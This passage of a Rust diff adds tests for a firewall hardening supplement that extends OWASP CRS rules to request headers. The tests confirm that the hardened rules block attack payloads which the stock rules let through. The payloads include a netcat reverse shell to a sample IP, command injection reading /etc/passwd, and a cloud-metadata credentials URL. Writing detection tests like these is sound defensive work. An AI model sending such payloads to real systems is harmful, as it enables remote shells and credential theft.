+                r#"{"subject":"Update","body_html":"PHAgc3R5bGU9ImNvbG9yOiMzMzM7Zm9udC1mYW1pbHk6QXJpYWwiPllvdXIgb3JkZXIgIzEwNDIgaGFzIHNoaXBwZWQuPC9wPg=="}"#,
+                "json.body_html",
+            ),
+            (
+                "Gmail raw message",
+                r#"{"raw":"VG86IGJvYkBleGFtcGxlLmNvbQ0KU3ViamVjdDogU2hpcHBlZA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9VVRGLTgNCg0KPHAgc3R5bGU9ImNvbG9yOiMzMzM7Zm9udC1mYW1pbHk6QXJpYWwiPllvdXIgb3JkZXIgIzEwNDIgaGFzIHNoaXBwZWQuPC9wPg"}"#,
+                "json.raw",
+            ),
+        ] {
+            assert_eq!(
+                run(&crs_only, "POST", "/api/x", &json, body.as_bytes()),
+                None,
+                "{name}: the CRS alone passes it"
+            );
+            assert_eq!(
+                run(&hardened, "POST", "/api/x", &json, body.as_bytes()).map(|(rule, _)| rule),
+                Some(10_941_100),
+                "{name}: rule 10941100 denies it"
+            );
+            let tuning = format!("SecRuleUpdateTargetById 10941100 \"!ARGS:{field}\"");
+            assert_eq!(
+                run(
+                    &tuned_crs_policy(&[], &[&tuning]),
+                    "POST",
+                    "/api/x",
+                    &json,
+                    body.as_bytes()
+                ),
+                None,
+                "{name}: the tuning of the README clears it"
+            );
+        }
+    }
+
+    /// A rule of `crs/rules/REQUEST-*.conf` (the head of a chain, not its children): what the id-list tests read.
+    #[cfg(feature = "embed-crs")]
+    struct CrsRule {
+        id: i32,
+        tags: Vec<String>,
+        phase: String,
+        targets: Vec<String>,
+        /// The operator as written, with its name (`@rx ...`).
+        operator: String,
+    }
+
+    /// The rules of the embedded CRS request files.
+    #[cfg(feature = "embed-crs")]
+    fn crs_request_rules() -> Vec<CrsRule> {
+        let mut rules = Vec::new();
+        for (name, bytes) in super::embedded_crs::EMBEDDED_CRS.iter().copied() {
+            if !(name.starts_with("crs/rules/REQUEST-") && name.ends_with(".conf")) {
+                continue;
+            }
+            // Logical lines: a trailing backslash continues the directive; a chained rule's children are skipped.
+            let mut directives = Vec::new();
+            let mut current = String::new();
+            for line in std::str::from_utf8(bytes).unwrap().lines().map(str::trim) {
+                if current.is_empty() && line.starts_with('#') {
+                    continue;
+                }
+                if let Some(part) = line.strip_suffix('\\') {
+                    current.push_str(part);
+                    current.push(' ');
+                } else {
+                    current.push_str(line);
+                    directives.push(std::mem::take(&mut current));
+                }
+            }
+            let mut in_chain = false;
+            for directive in directives.iter().filter(|line| line.starts_with("SecRule ")) {
+                let actions = directive.rsplit_once(" \"").map_or("", |(_, actions)| actions);
+                let parts: Vec<&str> = actions.trim_end_matches('"').split(',').map(str::trim).collect();
+                let chain = parts.contains(&"chain");
+                if std::mem::replace(&mut in_chain, chain) {
+                    continue;
+                }
+                let (targets, after_targets) = directive.strip_prefix("SecRule ").unwrap().split_once(' ').unwrap();
+                let operator = after_targets
+                    .rsplit_once(" \"")
+                    .map_or("", |(operator, _)| operator.trim())
+                    .trim_matches('"');
+                rules.push(CrsRule {
+                    id: parts
+                        .iter()
+                        .find_map(|part| part.strip_prefix("id:"))
+                        .unwrap()
+                        .parse()
+                        .unwrap(),
+                    tags: parts
+                        .iter()
+                        .filter_map(|part| part.strip_prefix("tag:'"))
+                        .map(|tag| tag.trim_end_matches('\'').to_owned())
+                        .collect(),
+                    phase: parts
+                        .iter()
+                        .find_map(|part| part.strip_prefix("phase:"))
+                        .unwrap_or_default()
+                        .to_owned(),
+                    targets: targets.split('|').map(str::to_owned).collect(),
+                    operator: operator.to_owned(),
+                });
+            }
+        }
+        rules
+    }
+
+    /// The ids of the rules at paranoia level 1 with one of the six attack tags and a request phase, whose targets
+    /// do not already name every request header.
+    #[cfg(feature = "embed-crs")]
+    fn crs_rules_that_skip_most_headers(rules: &[CrsRule]) -> BTreeSet<i32> {
+        const TAGS: [&str; 6] = [
+            "attack-rce",
+            "attack-sqli",
+            "attack-injection-generic",
+            "attack-rfi",
+            "attack-ssti",
+            "attack-lfi",
+        ];
+        rules
+            .iter()
+            .filter(|rule| {
+                TAGS.iter().any(|tag| rule.tags.iter().any(|t| t == tag))
+                    && rule.tags.iter().any(|t| t == "paranoia-level/1")
+                    && matches!(rule.phase.as_str(), "1" | "2")
+                    && !rule.targets.iter().any(|target| target == "REQUEST_HEADERS")
+            })
+            .map(|rule| rule.id)
+            .collect()
+    }
+
+    /// One `SecRuleUpdateTargetById` line of the supplement: the rule ids and the targets it adds or removes.
+    #[cfg(feature = "embed-crs")]
+    fn update_target_lines() -> Vec<(BTreeSet<i32>, Vec<&'static str>)> {
+        coraza::seclang::CRS_HARDENING_CONF
+            .lines()
+            .filter_map(|line| line.strip_prefix("SecRuleUpdateTargetById "))
+            .map(|rest| {
+                let (ids, targets) = rest.split_once('"').unwrap();
+                (
+                    ids.split_whitespace().map(|id| id.parse().unwrap()).collect(),
+                    targets.trim_end().trim_end_matches('"').split('|').collect(),
+                )
+            })
+            .collect()
+    }
+
+    /// The ids in the supplement's retargeting line must be the CRS rules that need it. A CRS update that adds, removes
+    /// or retargets a rule fails here until the line is regenerated; see the file's header.
+    #[cfg(feature = "embed-crs")]
+    #[test]
+    fn the_retargeted_rule_ids_are_the_level_1_rules_that_do_not_read_every_header() {
+        let rules = crs_request_rules();
+        let lines = update_target_lines();
+        let all_headers: Vec<&(BTreeSet<i32>, Vec<&str>)> = lines
+            .iter()
+            .filter(|(_, targets)| targets.contains(&"REQUEST_HEADERS"))
+            .collect();
+        assert_eq!(all_headers.len(), 1, "one directive adds every header: {all_headers:?}");
+        let listed = &all_headers[0].0;
+
+        let mut expected = crs_rules_that_skip_most_headers(&rules);
+        assert!(expected.len() > 40, "the parser found the rules: {expected:?}");
+        // 932180 reads only its own `X-Filename` headers and the file names of uploads; reading every header makes it
+        // match `Version/17.2` of every Safari. 921200 (LDAP injection) is not tagged with the six tags.
+        assert!(expected.remove(&932_180), "932180 is one of the rules");
+        expected.insert(921_200);
+        assert_eq!(
+            *listed,
+            expected,
+            "listed but not needed: {:?}; needed but not listed: {:?}",
+            listed.difference(&expected).collect::<Vec<_>>(),
+            expected.difference(listed).collect::<Vec<_>>()
+        );
+        // The rules that already read every header must not be listed: a negated key would take headers from them.
+        for id in [930_100, 930_110, 932_170, 944_100, 944_110, 944_120, 944_130, 944_150] {
+            assert!(!listed.contains(&id), "{id} reads every header itself");
+        }
+
+        // Every retargeting is by id: a tag also takes the rules of higher levels along (the PL2 rules 931130 and
+        // 931131 match `scheme://` anywhere, so a OneTrust, NextAuth or Shopify cookie would block every request of a
+        // site).
+        assert!(
+            !coraza::seclang::CRS_HARDENING_CONF
+                .lines()
+                .any(|line| line.starts_with("SecRuleUpdateTargetByTag")),
+            "the supplement retargets by rule id, not by tag"
+        );
+        // The remote file inclusion rules of paranoia level 1 also read cookie values, and no rule of a higher level
+        // does.
+        let cookie_lines: Vec<&BTreeSet<i32>> = lines
+            .iter()
+            .filter(|(_, targets)| targets == &["REQUEST_COOKIES"])
+            .map(|(ids, _)| ids)
+            .collect();
+        let remote_file_rules: BTreeSet<i32> = rules
+            .iter()
+            .filter(|rule| {
+                rule.tags.iter().any(|tag| tag == "attack-rfi") && rule.tags.iter().any(|tag| tag == "paranoia-level/1")
+            })
+            .map(|rule| rule.id)
+            .collect();
+        assert_eq!(
+            cookie_lines,
+            [&remote_file_rules],
+            "the cookie targets go to the level 1 remote file rules"
+        );
+
+        // A negated key excludes a header from every `REQUEST_HEADERS` target of the rule, its own included: no rule
+        // that a line retargets may name an excluded header (or all headers, or a pattern of them) natively, and every
+        // exclusion belongs to a rule that is retargeted. A key is a header name, never a regular expression: a pattern
+        // such as `/path$/` takes the headers a client names after a file or a URL away from the rules that read
+        // them.
+        for (ids, targets) in &lines {
+            let names: Vec<String> = targets
+                .iter()
+                .filter_map(|target| target.strip_prefix("!REQUEST_HEADERS:"))
+                .map(|name| {
+                    assert!(
+                        !name.starts_with('/'),
+                        "{name}: an exclusion names a header, it is no pattern"
+                    );
+                    name.to_ascii_lowercase()
+                })
+                .collect();
+            for id in ids {
+                if names.is_empty() {
+                    continue;
+                }
+                assert!(listed.contains(id), "{id} excludes headers but H1 does not retarget it");
+                let rule = rules.iter().find(|rule| rule.id == *id).unwrap();
+                for target in &rule.targets {
+                    let lower = target.to_ascii_lowercase();
+                    assert!(
+                        lower != "request_headers" && !lower.starts_with("request_headers:/"),
+                        "{id} reads {target} natively: a negated key would take headers from it"
+                    );
+                    if let Some(name) = lower.strip_prefix("request_headers:") {
+                        assert!(
+                            !names.iter().any(|header| header == name),
+                            "{id} reads {target} natively, and a line excludes it"
+                        );
+                    }
+                }
+            }
+        }
+    }
+
+    /// The page-URL headers the file documents are excluded by name, and every other header, whatever its name ends
+    /// in, is read: a backend feeds `X-File-Path`, `X-Webhook-Url`, `X-Callback-Uri` or `X-Return-Redirect` to a file
+    /// system or a fetcher, and the CRS alone passes a payload in them.
+    #[cfg(feature = "embed-crs")]
+    #[test]
+    fn the_page_url_exclusion_names_the_url_headers_and_reads_the_headers_that_name_a_sink() {
+        const PAGE_URL_HEADERS: [&str; 11] = [
+            "Referer",
+            "HX-Current-URL",
+            "X-Original-URL",
+            "X-Original-URI",
+            "X-Forwarded-Uri",
+            "X-Forwarded-Path",
+            "X-Envoy-Original-Path",
+            "X-Auth-Request-Redirect",
+            "X-Rewrite-URL",
+            "X-WAWS-Unencoded-URL",
+            "Next-Url",
+        ];
+        const ENCODING_HEADERS: [&str; 8] = [
+            "TE",
+            "Content-Encoding",
+            "X-Accept-Encoding",
+            "X-Forwarded-Accept-Encoding",
+            "grpc-accept-encoding",
+            "grpc-encoding",
+            "Fastly-Orig-Accept-Encoding",
+            "X-Original-Accept-Encoding",
+        ];
+        let excluded = |ids: &[i32]| -> BTreeSet<String> {
+            update_target_lines()
+                .into_iter()
+                .filter(|(line_ids, targets)| {
+                    // Not the line that adds every header and its own exceptions (H1).
+                    !targets.contains(&"REQUEST_HEADERS") && ids.iter().all(|id| line_ids.contains(id))
+                })
+                .flat_map(|(_, targets)| targets)
+                .filter_map(|target| target.strip_prefix("!REQUEST_HEADERS:").map(str::to_ascii_lowercase))
+                .collect()
+        };
+        let lower =
+            |names: &[&str]| -> BTreeSet<String> { names.iter().map(|name| name.to_ascii_lowercase()).collect() };
+        assert_eq!(
+            excluded(&[930_120, 932_120, 932_160, 932_235]),
+            lower(&PAGE_URL_HEADERS),
+            "930120, 932120, 932160 and 932235 skip the page-URL headers and no others"
+        );
+        // 931100 also skips `Origin`. The `User-Agent` exclusions of 932120 and 932235 are on lines of their own.
+        let mut with_origin = lower(&PAGE_URL_HEADERS);
+        with_origin.insert("origin".to_owned());
+        assert_eq!(
+            excluded(&[931_100]),
+            with_origin,
+            "931100 skips the page URL and `Origin`"
+        );
+        assert_eq!(
+            excluded(&[932_260]),
+            lower(&ENCODING_HEADERS),
+            "932260 skips `TE` and the copies of `Accept-Encoding`"
+        );
+
+        let (hardened, crs_only) = (crs_policy(true), crs_policy(false));
+        let page = "/search?q=ruby+on+rails+jobs";
+        for name in PAGE_URL_HEADERS {
+            assert_eq!(
+                run(&hardened, "GET", "/static/app.css", &headers(&[(name, page)]), b""),
+                None,
+                "the page URL in {name} passes"
+            );
+        }
+        // Headers a backend reads as a path, a URL or an encoding, under names the file does not list: the payloads
+        // of the 930120 (system file), 932160 (shell path), 932120/932235 (command) and 931100 (internal URL) families.
+        // The CRS alone passes each of them at level 1.
+        let payloads: [(&str, i32); 4] = [
+            ("/etc/passwd", 930_120),
+            (";cat /etc/passwd", 930_120),
+            ("/u;nc -e /bin/sh 203.0.113.9 4444", 932_160),
+            (
+                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+                931_100,
+            ),
+        ];
+        for name in [
+            "X-File-Path",
+            "X-Upload-Path",
+            "X-Webhook-Url",
+            "X-Image-Url",
+            "X-Callback-Uri",
+            "X-Return-Redirect",
+            "X-Cmd-Path",
+            "X-Payload-Encoding",
+            "X-Request-URI",
+        ] {
+            for (payload, rule) in payloads {
+                let request = headers(&[(name, payload)]);
+                let (blocked, matched) = run_detailed(&hardened, "GET", "/app", &request, b"");
+                assert!(
+                    blocked.is_some() && matched.contains(&rule),
+                    "{payload:?} in {name} blocks by rule {rule}: {matched:?}"
+                );
+                assert_eq!(
+                    run(&crs_only, "GET", "/app", &request, b""),
+                    None,
+                    "the CRS alone passes {payload:?} in {name}"
+                );
+            }
+        }
+    }
+
+    /// The supplement reads the `User-Agent` for rule 932235 through a copy of its operator that skips Composer's
+    /// shape (rule 10932235). The copy must stay equal to the operator of the CRS in the build: a CRS update that
+    /// changes 932235 fails here until the copy is regenerated.
+    #[cfg(feature = "embed-crs")]
+    #[test]
+    fn the_user_agent_copy_of_rule_932235_holds_the_operator_of_the_embedded_crs() {
+        let crs = crs_request_rules();
+        let original = crs.iter().find(|rule| rule.id == 932_235).unwrap();
+        assert!(
+            original.operator.starts_with("@rx "),
+            "the operator of 932235: {}",
+            original.operator
+        );
+        let mut lines = coraza::seclang::CRS_HARDENING_CONF.lines();
+        let head = lines.find(|line| line.contains("id:10932235,"));
+        assert!(head.is_some(), "the supplement defines rule 10932235");
+        let head = head.unwrap();
+        assert!(
+            head.contains("phase:1,"),
+            "the copy runs in phase 1, before 949110 reads the score: {head}"
+        );
+        let child = lines
+            .next()
+            .and_then(|line| line.trim().strip_suffix('\\'))
+            .and_then(|line| line.trim_end().strip_prefix("SecRule REQUEST_HEADERS:User-Agent "));
+        assert!(child.is_some(), "the copy is a chain whose child reads the User-Agent");
+        let operator = child
+            .unwrap()
+            .strip_prefix('"')
+            .and_then(|operator| operator.strip_suffix('"'))
+            .unwrap();
+        assert_eq!(
+            operator, original.operator,
+            "10932235 must hold the operator of CRS rule 932235 (regenerate it from crs/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf)"
+        );
+    }
 }
 
 #[cfg(test)]
@@ -1684,7 +2861,7 @@ mod tests {
         assert!(error.contains("unknown directive"), "message was {error:?}");
     }
 
-    /// The README's CRS policy: the built-in baseline, blocking, then the embedded CRS.
+    /// The README's CRS policy: the built-in baseline, blocking, then the embedded CRS and the hardening supplement.
     #[cfg(feature = "embed-crs")]
     const DOCUMENTED_CRS_POLICY: &str = r#"{
         "directives_map": {
@@ -1692,7 +2869,8 @@ mod tests {
                 "Include @recommended-conf",
                 "SecRuleEngine On",
                 "Include crs/crs-setup.conf",
-                "Include crs/rules/*.conf"
+                "Include crs/rules/*.conf",
+                "Include @crs-hardening-conf"
             ]
         },
         "default_directives": "crs"
